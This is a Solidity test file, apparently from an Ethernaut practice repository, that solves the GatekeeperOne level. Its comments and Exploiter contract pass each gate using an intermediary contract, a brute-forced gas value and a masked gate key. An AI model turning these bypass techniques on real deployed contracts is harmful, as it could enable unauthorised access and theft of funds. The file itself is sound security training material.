// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/GatekeeperOne.sol";
import "src/levels/GatekeeperOneFactory.sol";
import "forge-std/console.sol";

contract TestGatekeeperOne is BaseTest {
    GatekeeperOne private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new GatekeeperOneFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = GatekeeperOne(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.entrant(), address(0));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        // SOLVE gateOne() check:
        // To solve the gateOne barrier we need to have `msg.sender != tx.origin`
        // If we have an external contract to call the `GatekeeperOne` contract
        // for us in that case `msg.sender === ExploiterContract` but
        // `tx.origin === playerAddress`

        // SOLVE gateTwo() check:
        // Now here things get "complicated" because you need to call the `enter`
        // with a value for gas that will result a multiple of 8191 when the `require(gasleft().mod(8191) == 0);` is executed
        // it's not an easy task because depending on the solidity version used to compile the contract and how the compiler is runned (optimizations flags)
        // the gas usage change. to solve this we should need to start from that specific requirement back to the root of `enter` and calculate
        // how much gas each EVM opcodes has consumed. What we can do following cmichel suggestion https://cmichel.io/ethernaut-solutions/
        // is to leverage the fact that we are using a local test environment (or a forked one) instead of wasting gas to make a try
        // So we know that the gas used by the `enter` tx must be at least 8191 + all the gas spent to execute those opcodes
        // We can make a range guess and brute force it until it works. This is the code example:
        // for (uint256 i = 0; i <= 8191; i++) {
        //     try victim.enter{gas: 800000 + i}(gateKey) {
        //         console.log("passed with gas ->", 800000 + i);
        //         break;
        //     } catch {}
        // }
        // Basically you start with a base gas just to be sure that the tx will not revert because of Out of Gas exeception
        // and you try to find which value of gas will make the tx pass
        // In our case (solidity compiler + optimization flags) the correct gas value is: 802929

        // SOLVE gateThree() check:
        // To do so we need to understand how casting works on Solidity
        // When you cast from a smaller type to a bigger one there's no problem
        // All the high order bits are filled with zero and th evalue does not change
        // The problem is when you cast a bigger type to smaller one. Depending on the value
        // you could encounter in data loss because those high order bits are lost and truncated
        // For example uint16(0x0101) is 257 in decimal but if you down cast it to uint8 it will be 1 in decimal

        // In solidity you can solve this challenge applying a "mask" to the input with the "AND" operator
        // This operator will put the input binary value in the output position if the mask has a 1 (binary) and a 0 (doesn't metter what we have as input)
        // if in the mask there's a 0
        // If you need a well made exaplantion of this solution you can look at 0xSage solution
        // here https://medium.com/coinmonks/ethernaut-lvl-13-gatekeeper-1-walkthrough-how-to-calculate-smart-contract-gas-consumption-and-eb4b042d3009
        // Let's start with the first requirement: `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`
        // The less important 2 bytes must equal the less important 4 bytes
        // It means that we want to "remove" the 2 more important bytes of those 4 bytes but maintain the value of the less important one
        // Because what we want is to make 0x11111111 be equal to 0x00001111
        // The mask to accomplish this is equal to 0x0000FFFF
        // The second requirement say that the less important 8 bytes of the input must be different compared to the less important 4 bytes
        // We need to remember that we also need to maintain the first requirement.
        // So we need to make 0x00000000001111 be != 0xXXXXXXXX00001111
        // We need to update our mask to make all the first 4 bytes "pass" to the output
        // Our new mask will be "0xFFFFFFFF0000FFFF"
        // Now we just need to apply that mask to our `tx.origin` casted to a bytes8 (an address is a 20 bytes type)

        bytes8 key = bytes8(uint64(uint160(address(player)))) & 0xFFFFFFFF0000FFFF;

        Exploiter exploiter = new Exploiter(level);

        vm.prank(player, player);
        exploiter.exploit(key);

        // Check we have solved the challenge
        assertEq(level.entrant(), player);
    }
}

contract Exploiter is Test {
    GatekeeperOne private victim;
    address private owner;

    constructor(GatekeeperOne _victim) public {
        victim = _victim;
        owner = msg.sender;
    }

    function exploit(bytes8 gateKey) external {
        victim.enter{gas: 802929}(gateKey);
    }
}
